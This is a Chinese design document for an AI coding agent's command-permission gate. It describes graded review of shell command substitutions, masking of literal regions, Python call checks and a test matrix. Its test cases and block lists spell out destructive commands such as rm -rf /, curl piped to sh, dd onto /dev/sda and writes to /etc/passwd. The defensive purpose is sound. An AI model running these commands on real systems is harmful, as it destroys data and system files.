# 权限闸门 · 动态构造分级审核设计

> 背景代号"剥洋葱"——把命令替换（`$()`/反引号/进程替换）内部的内容一层层剥出来，按与顶层完全相同的标准独立审核：安全就放行，危险才弹窗。配套 mask 盲区（单引号/heredoc 字面量）与 Python 段轻量检测。

> **后续修订（已删）：** 本文「放行留痕」设计（tool 结果前插 `[权限闸门] …放行` 备注）已移除。考虑到大模型的纯净性：工具正常工作时，模型其实不知道这一行代表什么，也没有必要去理解——这一行纯属多余，故最终删掉。

## 一、背景与动机

permission-gate 的动态构造检测（`hasDynamicConstructs`）对命令替换做**无差别降级**：只要 token 含 `$(`、反引号、`<(`、`>(` 就弹窗人工确认，不检查内部装的是什么。

实际代价：

1. **误报是日常频率，不是偶发**：8/1–8/4 四天 sessions 里共 **87 条**含命令替换的 bash 调用，绝大多数是正常工作命令——按当前引擎全部命中动态构造、必然弹窗：

   | 类别 | 真实命令形态 | 频次 |
   |---|---|---|
   | 包路径定位 | `PKG=$(ls -d node_modules/.pnpm/@earendil-works+pi-coding-agent@*/...)`、`PI_PKG_DIR=$(ls -d ~/.local/share/pnpm/global/5/.pnpm/...@0.83.0*/...)` | 高（每天多条） |
   | 文件定位 | `f=$(find ... -name wire.jsonl \| head -1)`、`for f in $(find . -name ...)`、`P=$(find /tmp/hf_home -path ...)` | 高 |
   | 时间计算 | `DUE=$(date -d '1 minute ago' +%Y-%m-%dT%H:%M:%S%:z)` | 中 |
   | 进程查找 | `PID=$(pgrep -f ...)`、`AID=$(pgrep -x air \| head -1)` | 中 |
   | 抓取解析 | `CSS=$(curl -s localhost:8080/ \| grep -o 'assets/index-[^\"]*')`、`code=$(curl -s -m 5 -o /dev/null -w ...)` | 中 |
   | 循环变量 | `for d in ~/.cache/yay/*/; do p=$(basename $d)` | 中 |
   | 可执行定位 | `PI_BIN=$(which pi)`、`PI_BIN=$(command -v pi)` | 低 |
   | 键值生成 | `KEY=$(python3 -c 'import secrets; ...')` | 低 |

2. **弹窗把模型调教坏**：8/2 用户被弹烦后直接下令「避免使用动态构造指令」，模型被迫改用通配符静态路径；8/4 又出现「全程静态路径，不会再弹窗」「别让我看到更多的安全弹窗就行」——模型不敢用正常手段，用户被迫逐条放行正常工作指令。
3. **字面量区域误触**：单引号内容（shell 不解析）与带引号定界符 heredoc（`<<'EOF'`，不展开）里的 `$(`、反引号、`>` 只是 Python 代码/字符串字面量，却会被 token 子串检查命中。大模型常在命令末尾写 `python3 - <<'EOF'` 小工具（sessions 里已有大批真实案例），内容里一旦出现 `$(...)` 或反引号即误报。

目标：**动态构造分级审核**——内部内容无副作用则放行（tool 结果留备注），内部命中危险规则或危险调用才弹窗。

## 二、目标与非目标

### 目标

- 只读命令替换（`$(ls ...)`、`$(pwd)`、`$(mktemp -d)`、`$(git rev-parse ...)`）自动放行，不再弹窗
- 危险内部内容（`$(rm -rf /)`、`$(curl x | sh)`、`$(find / -delete)`、`$(echo a > /etc/passwd)`）仍弹窗
- 单引号区域与带引号定界符 heredoc 内容不参与 shell 动态检测（字面量语义）
- 拆出的 Python 代码段（`python3 -c '...'`、`python3 << 'EOF'`）做轻量危险调用检测
- 放行留痕：tool 结果带「已按内部审核放行」备注，模型有知情权
- `dd` 命令加入弹窗列表

### 非目标

- 不维护独立"只读命令白名单"——内部审核直接复用现有 RULES，单一事实来源
- 不解析 Python 语法——子串级检测即可
- 不检测 `python3 script.py` 的文件内容（模型写文件时内容已可见）
- 不给 `go run` / `python3 xxx.py` 加执行类规则（与顶层行为一致，见"决策"）
- ~~第一版不做 `> /dev/null` 例外~~ 已实现（见“边界与已知权衡”更新）

## 三、方案总览

```
原始命令
  │
  ├─ ① maskShellBlindZones
  │     单引号区域 '...' → 等长空格
  │     带引号定界符 heredoc <<'EOF'...EOF → 等长空格
  │     裸定界符 <<EOF...EOF → 不屏蔽（shell 会展开）
  │     输出：masked + pySegments（python 消费的代码段原文）
  │
  ├─ ② auditSubstitutions（剥洋葱，在 masked 上）
  │     迭代提取最内层 $()/反引号/<()>() 内容
  │     每层跑 isCommandSafe + hasDynamicConstructs + findPipeExec
  │     安全 → 占位符替换，继续剥；危险 → 记入 dangerous 列表
  │     输出：peeled + dangerous[]
  │
  ├─ ③ pythonDangerous（在 pySegments 上）
  │     子串黑名单：os.system / subprocess / Popen / eval( / exec( /
  │     shutil.rmtree / os.remove / os.unlink / os.chmod / os.chown / dd
  │
  ├─ ④ 最终判定（在 peeled 上）
  │     matchDangerous + hasDynamicConstructs + findPipeExec
  │
  └─ 危险信号任一命中 → 弹窗（matched 带原文高亮）
      全部干净 → 放行 + tool_result 备注
```

## 四、组件设计

### 1. `maskShellBlindZones(cmd): { masked: string; pySegments: string[] }`

字符串层扫描（token 层会把 `$(ls -la)` 拆碎，必须在原始字符串上做）：

- **单引号区域**：`'` 到下一个 `'`（bash 单引号无转义、硬边界，简单配对即可）。内容替换为等长空格。`'a'\''b'` 是三个拼接段，逐段配对自然处理。
- **heredoc**：`<<-?(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1` 定位定界符（支持 `<<'EOF'`、`<<"EOF"`、`<<EOF`、`<<-EOF`），到行首 `^\s*定界符\s*$` 结束。**带引号定界符**：内容行替换为等长空格；**裸定界符**：不替换（shell 会展开，必须保持检测）。
- **pySegments 收集**：mask 时顺带提取被 python 消费的代码段原文——`python3? -c` 的引号参数（正则捕获 `python3? -c\s+('([^']*)'|"([^"]*)")`）、python 命令后跟 `<<` 定界符的 heredoc 内容。供步骤 ③ 使用。

屏蔽后 `$()` 在单引号里不再被检测，因为内容已变成空格。

### 2. `auditSubstitutions(cmd): { peeled: string; dangerous: string[] }`

迭代剥洋葱（在 masked 命令上）：

1. 用正则找最内层替换（内容不含嵌套括号）：`\$\(([^()]*)\)`、`` `([^`]*)` ``、`<\(([^()]*)\)`、`>\(([^()]*)`）
2. 对每层内容跑完整判定：`isCommandSafe(inner) && !hasDynamicConstructs(inner) && findPipeExec(inner).length === 0`
3. 安全 → 内容替换为占位符 token（如 `__pi_subst__`，不在任何规则命令/flag/参数集合中，不影响后续匹配），继续找下一层
4. 危险 → 该层原文记入 `dangerous[]`（供 GUI 高亮与弹窗），停止
5. 循环直到无替换，返回剥完的命令与危险列表

外层危险不会被内层安全掩盖：剥完后整体还要再过一遍 `matchDangerous`（`rm -rf $(mktemp -d)` 剥完仍命中 rm-recursive）。

### 3. `pythonDangerous(segments: string[]): string[]`

对每个 Python 代码段做子串黑名单检测，返回命中子串列表：

```
os.system / subprocess / Popen / eval( / exec( /
shutil.rmtree / os.remove / os.unlink / os.chmod / os.chown / dd
```

普通文件处理（open/read/write/json/urllib）不拦。不解析 Python 语法。

### 4. RULES 补充

| 规则 | 定义 | 覆盖 |
|---|---|---|
| `find-delete` | cmd: `find`，anyFlags: `[-delete, -exec, -ok]` | `$(find / -delete)` |
| `write-redirect` | cmd 省略（任意命令），anyArgs: `[">", ">>"]` | `$(echo a > /etc/passwd)`、顶层 `echo a > f`；`2>&1` 是单 token 不含独立 `>`，不误伤 |
| `dd` | cmd: `dd`，弹窗级（autoReject: false） | `dd if=/dev/zero of=/dev/sda`；of= 路径无法静态枚举，按命令名兜底 |

**`RuleDef.cmd` 改为可选**（省略 = 任意命令），`matchRule` 相应调整：`if (rule.cmd && !cmds.includes(tokens[cmdIdx])) return null`。`write-redirect` 借此实现"任意命令 + 重定向 token"。

### 5. `findPipeExec(cmd): string[]`

跨段管道执行检测（现有 `splitCommands` 按 `|` 分段后丢失管道信息，无法区分"管道右侧"与"普通命令"）：

- 新 `splitWithSeparators(cmd)`：按 `&&`/`||`/`;`/`|`/换行 分段并保留分隔符
- 管道右侧段（`sep === "|"`）的命令名在执行器列表：`sh/bash/zsh/dash/python/python3/perl/node/sudo` → 命中
- `curl x | sh` 命中；`python3 script.py` 是单段、无管道，不命中；`ls | head` 的 head 不在列表，不命中
- 对整体 peeled 命令与剥洋葱每层内容都执行

## 五、接入（index.ts 数据流）

```
tool_call bash:
  const { masked, pySegments } = maskShellBlindZones(command)
  const pyDanger = pythonDangerous(pySegments)
  const { peeled, dangerous } = auditSubstitutions(masked)
  const pipeExec = findPipeExec(peeled)
  const rules = matchDangerous(peeled)
  const dynamic = hasDynamicConstructs(peeled)

  合并危险信号：
  - pyDanger / dangerous / pipeExec 任一非空 → 弹窗（DYNAMIC_RULE，matched 带命中原文）
  - rules 全 autoReject → 直接拦（现有逻辑）
  - rules 非空 → 弹窗（现有逻辑）
  - dynamic（剥完后仍有动态：变量命令 / eval / bash -c）→ 弹窗（现有 DYNAMIC_RULE）
  - 全部干净 → 放行，命令记入模块级 Set

tool_result（新增 handler）:
  Set 命中 → content 前插入「[权限闸门] 命令含命令替换，内部指令已通过规则审核，放行」→ 移除
```

## 六、测试矩阵（rule-engine.test.ts）

### H 组：盲区与剥洋葱

| # | 命令 | 预期 |
|---|---|---|
| H1 | `PKG=$(ls -d node_modules/.pnpm/@earendil-works+pi-coding-agent@*/...)` | ✅ 放行（真实案例 8/2） |
| H2 | `AI=$(ls -d ...)` | ✅ 放行（真实案例 8/2） |
| H3 | `python3 - <<'EOF'` dufs 下载脚本形态 | ✅ 放行（真实案例 8/4） |
| H4 | `python3 - <<'EOF'` 内含 `os.system('rm -rf /')` | ⚠️ 弹窗 |
| H5 | `python3 -c 'print("$(ls)")'` | ✅ 放行（单引号字面量） |
| H6 | `python3 -c 'import os; os.system("ls")'` | ⚠️ 弹窗 |
| H7 | `echo '$(rm -rf /)'` | ✅ 放行（字面量，不执行） |
| H8 | `bash -c 'rm -rf /'` | ⚠️ 弹窗（命令级检测不受屏蔽影响） |
| H9 | `$(curl x \| sh)` | ⚠️ 弹窗（pipe-exec） |
| H10 | `$(find / -delete)` | ⚠️ 弹窗（find-delete） |
| H11 | `$(echo a > /etc/passwd)` | ⚠️ 弹窗（write-redirect） |
| H12 | `ls $(rm -rf /)` | ⚠️ 弹窗（剥洋葱内部命中） |
| H13 | `$(ls $(rm -rf /))` | ⚠️ 弹窗（嵌套） |
| H14 | `rm -rf $(mktemp -d)` | ⚠️ 弹窗（外层危险不被掩盖） |
| H15 | `VAR='$(rm)'; eval $VAR` | ⚠️ 弹窗（eval 检测仍在） |
| H16 | `python3 - <<EOF` 裸定界符含 `$(rm -rf /)` | ⚠️ 弹窗（shell 会展开，剥洋葱审出 rm） |
| H17 | `python3 - <<EOF` 裸定界符含 `$(ls)` | ✅ 放行（展开执行的是只读命令） |
| H18 | `echo 'os.system("rm -rf /")'` | ✅ 放行（字面量输出，非 python 执行段） |
| H19 | `ls $(pwd) && echo ok` | ✅ 放行 |
| H20 | `DUE=$(date -d '1 minute ago' +%Y-%m-%dT%H:%M:%S%:z)` | ✅ 放行（时间计算，真实案例） |
| H21 | `for f in $(find . -name 'wire.jsonl' \| head -3); do echo $f; done` | ✅ 放行（find 只读循环，真实案例） |
| H22 | `CSS=$(curl -s localhost:8080/ \| grep -o 'assets/index-[^\"]*')` | ✅ 放行（抓取+解析，管道右侧 grep 非执行器，真实案例） |
| H23 | `KEY=$(python3 -c 'import secrets; print(secrets.token_hex(16))')` | ✅ 放行（python 段无危险调用，真实案例） |
| H24 | `PI_BIN=$(which pi)` | ✅ 放行（which 定位，真实案例） |

### I 组：dd 与回归

| # | 命令 | 预期 |
|---|---|---|
| I1 | `dd if=/dev/zero of=/dev/sda bs=1M` | ⚠️ 弹窗 |
| I2 | `dd if=/dev/sda of=/tmp/backup.img` | ⚠️ 弹窗（保守：备份也确认） |
| I3 | `$(dd if=/dev/zero of=/dev/sda)` | ⚠️ 弹窗（剥洋葱内部命中） |
| I4 | `python3 - <<'EOF'` 内含 `os.system('dd ...')` | ⚠️ 弹窗（Python 子串表含 dd） |
| I5 | 现有 96 用例 | 全过（回归） |

## 七、边界与已知权衡

- ~~`> /dev/null` 会命中 write-redirect~~ 已优化：write-redirect 命中 `>` / `>>` / `&>` / `&>>` 时，若下一 token 是 `/dev/null`（丢弃输出）不视为写文件；`cmd > /dev/null 2>&1` 等高频静默写法放行。真文件重定向（含混合场景 `> /dev/null > real.txt`）仍拦截。`&>` / `&>>` 双流重定向写文件此前漏判，一并补齐
- 单引号内容被 mask 后不参与一切 shell 检测；`echo '$(rm -rf /)'` 放行是正确的（输出字符串，不执行）
- 裸 heredoc（`<<EOF`）内容不 mask，但同样走剥洋葱审核：展开执行的内容按内容判定——`$(ls)` 放行、`$(rm -rf /)` 弹窗，与整体分级语义一致
- 顶层 `python3 -c 'os.system(...)'` 也会弹窗（pySegments 检测对顶层 -c 同样生效）——比现状更安全，是预期的行为变化
- `python3 script.py` 不检测文件内容：模型写文件时内容已可见，与顶层 `go run` 同理
- mask 用等长空格保持原命令长度，避免影响行号/展示

## 八、决策记录

- **go run / python3 xxx.py 不加执行类规则**：与顶层行为一致。代码是模型自己写的，可见性足够；「模型写恶意脚本自己执行」弹窗拦不住（先写文件再跑的路径），不是命令形态问题
- **安全动态放行带备注而非静默**：模型有知情权，白名单万一有漏网，模型侧能看到
- **内部审核复用 RULES 而非独立白名单**：单一事实来源，规则统一
- **dd 全部弹窗而非精准匹配 of=/dev/**：of= 路径无法静态枚举，dd 使用频率低，弹窗成本可接受

## 九、验收标准

1. 96 旧用例 + H 组 24 条 + I 组 5 条全部通过
2. tsc 零报错（含扩展与 lib）
3. H1/H2 真实案例命令不再弹窗，直接放行且 tool 结果带备注
4. H8/H12-H16 危险形态仍弹窗，matched 高亮指向危险替换原文
5. GUI 数据链路端到端：dangerous 原文能透传到 GateView 高亮
